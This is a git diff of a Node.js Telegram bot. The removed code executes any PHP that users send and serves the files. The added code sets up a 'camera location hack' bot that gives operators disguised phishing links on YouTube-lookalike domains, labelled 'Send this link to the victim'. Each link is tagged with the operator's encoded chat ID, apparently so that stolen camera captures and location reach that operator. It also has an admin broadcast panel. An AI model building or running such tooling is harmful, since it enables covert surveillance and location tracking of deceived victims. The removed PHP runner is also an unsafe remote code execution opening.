@@ -1,70 +1,150 @@
-const TelegramBot = require("node-telegram-bot-api");
-const express = require("express");
-const fs = require("fs");
-const { exec } = require("child_process");
-const path = require("path");
+const TelegramBot = require('node-telegram-bot-api');
+const token = process.env.BOT_TOKEN;
+const bot = new TelegramBot(token, { polling: true });
 
-// Environment Variables
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const PORT = process.env.PORT || 3000;
-const BASE_URL = process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : "http://localhost:3000";
+const linkData = [
+  {
+    name: "📷 camera hack 📷",
+    links: [{ text: "🌍 Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://youthub-video.odoo.com/" }]
+  },
+  {
+    name: "🌍 location 🌍",
+    links: [{ text: "Costam domen =  ❤️ YouTube ❤️ Send this link to the victim", value: "https://y0uthub-c0m-vide0.odoo.com/1-1/" }]
+  }
+];
 
-// Check if BOT_TOKEN is defined
-if (!BOT_TOKEN) {
-  console.error("ERROR: BOT_TOKEN is not defined. Please set it in the Secrets tab.");
-  process.exit(1);
+function encodeBase64(text) {
+  return Buffer.from(text.toString()).toString('base64');
 }
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-const app = express();
-
-// Create php_files directory if it doesn't exist
-const phpFilesDir = path.join(__dirname, 'php_files');
-if (!fs.existsSync(phpFilesDir)) {
-    fs.mkdirSync(phpFilesDir, { recursive: true });
+function generateMainMenu() {
+  return linkData.map(item => ({ text: item.name, callback_data: `menu_${item.name}` }));
 }
 
-// Middleware to serve PHP files dynamically
-app.get("/:filename", (req, res) => {
-    const filePath = path.join(phpFilesDir, req.params.filename);
-    if (fs.existsSync(filePath)) {
-        exec(`php ${filePath}`, (error, stdout, stderr) => {
-            if (error) {
-                res.send(`<pre>Error: ${stderr}</pre>`);
-            } else {
-                res.send(`<pre>${stdout}</pre>`);
-            }
-        });
-    } else {
-        res.status(404).send("File not found.");
+const fs = require('fs');
+
+function saveChatId(chatId) {
+  try {
+    let chatIds = [];
+    if (fs.existsSync('users.txt')) {
+      chatIds = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
     }
+    if (!chatIds.includes(chatId.toString())) {
+      fs.appendFileSync('users.txt', chatId + '\n');
+    }
+  } catch (err) {
+    console.error('Error saving chat ID:', err);
+  }
+}
+
+bot.onText(/\/start/, async (msg) => {
+  const chatId = msg.chat.id;
+  saveChatId(chatId);
+  const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
+  await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack Bot! Choose an option below:", {
+    reply_markup: { inline_keyboard: menu }
+  });
 });
 
-// Simple home route
-app.get("/", (req, res) => {
-    res.send("Telegram PHP Bot is running!");
-});
+bot.on('callback_query', async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+  const data = callbackQuery.data;
 
-// Start Express Server
-app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on port ${PORT}`);
-    console.log(`Base URL: ${BASE_URL}`);
+  if (data.startsWith('menu_')) {
+    const buttonName = data.replace('menu_', '');
+    const buttonData = linkData.find(b => b.name === buttonName);
+    if (!buttonData) return bot.sendMessage(chatId, "Button not found.");
 
-    bot.onText(/\/start/, (msg) => {
-        bot.sendMessage(msg.chat.id, "Send me a PHP code, and I'll execute it for you!");
+    const encodedChatId = encodeBase64(chatId);
+    let message = `🔗 *Links for ${buttonName}:*\n\n`;
+
+    buttonData.links.forEach(link => {
+      const modifiedLink = `${link.value}?i=${encodedChatId}`;
+      message += `🔹 ${link.text}: ${modifiedLink}\n\n`;
     });
 
-    bot.on("message", async (msg) => {
-        if (msg.text && msg.text.startsWith("<?php")) {
-            const filename = `code_${msg.chat.id}_${Date.now()}.php`;
-            const filePath = path.join(phpFilesDir, filename);
+    await bot.sendMessage(chatId, message, {
+      parse_mode: 'Markdown',
+      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_to_main" }]] }
+    });
+  } else if (data === 'back_to_main') {
+    const menu = generateMainMenu().map(a => [{ text: a.text, callback_data: a.callback_data }]);
+    await bot.sendMessage(chatId, "🎉 Welcome to the camera location hack bot! Choose an option below:", {
+      reply_markup: { inline_keyboard: menu }
+    });
+  }
+});
 
-            fs.writeFileSync(filePath, msg.text);
+//To store broadcast states. Needs to be initialized before use.
+const broadcastStates = new Map();
 
-            const phpUrl = `${BASE_URL}/${filename}`;
-            bot.sendMessage(msg.chat.id, `Your PHP code is running at: ${phpUrl}`);
-        } else if (msg.text && !msg.text.startsWith("/")) {
-            bot.sendMessage(msg.chat.id, "Please send PHP code starting with <?php");
+// Admin configuration
+const ADMIN_ID = process.env.ADMIN_ID;
+
+// Admin commands
+bot.onText(/\/admin/, async (msg) => {
+  const chatId = msg.chat.id;
+  if (chatId.toString() === ADMIN_ID) {
+    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
+    const adminMenu = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📊 Total Users", callback_data: "admin_users" }],
+          [{ text: "📢 Broadcast Message", callback_data: "admin_broadcast" }]
+        ]
+      }
+    };
+    await bot.sendMessage(chatId, `🔐 Admin Panel\nTotal Users: ${users.length}`, adminMenu);
+  }
+});
+
+// Enhanced callback handling
+bot.on('callback_query', async (callbackQuery) => {
+  const chatId = callbackQuery.message.chat.id;
+  const data = callbackQuery.data;
+
+  if (chatId.toString() === ADMIN_ID) {
+    if (data === 'admin_users') {
+      const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
+      await bot.sendMessage(chatId, `📊 Total Users: ${users.length}\n\nUser IDs:\n${users.join('\n')}`);
+    } else if (data === 'admin_broadcast') {
+      broadcastStates.set(chatId, true);
+      await bot.sendMessage(chatId, '📢 Send your broadcast message (text, image or video):');
+    }
+  }
+
+  // Existing callback handling
+  if (data.startsWith('menu_')) {
+    // ... existing code ...
+  }
+});
+
+// Enhanced message handling
+bot.on('message', async (msg) => {
+  const chatId = msg.chat.id;
+
+  if (chatId.toString() === ADMIN_ID && broadcastStates.get(chatId)) {
+    broadcastStates.delete(chatId);
+    const users = fs.readFileSync('users.txt', 'utf8').split('\n').filter(id => id);
+
+    let successCount = 0;
+    let failCount = 0;
+
+    for (const userId of users) {
+      try {
+        if (msg.text) {
+          await bot.sendMessage(userId, msg.text);
+        } else if (msg.video) {
+          await bot.sendVideo(userId, msg.video.file_id, { caption: msg.caption });
+        } else if (msg.photo) {
+          await bot.sendPhoto(userId, msg.photo[msg.photo.length - 1].file_id, { caption: msg.caption });
         }
-    });
+        successCount++;
+      } catch (err) {
+        failCount++;
+      }
+    }
+
+    await bot.sendMessage(chatId, `📢 Broadcast completed!\nSuccess: ${successCount}\nFailed: ${failCount}`);
+  }
 });
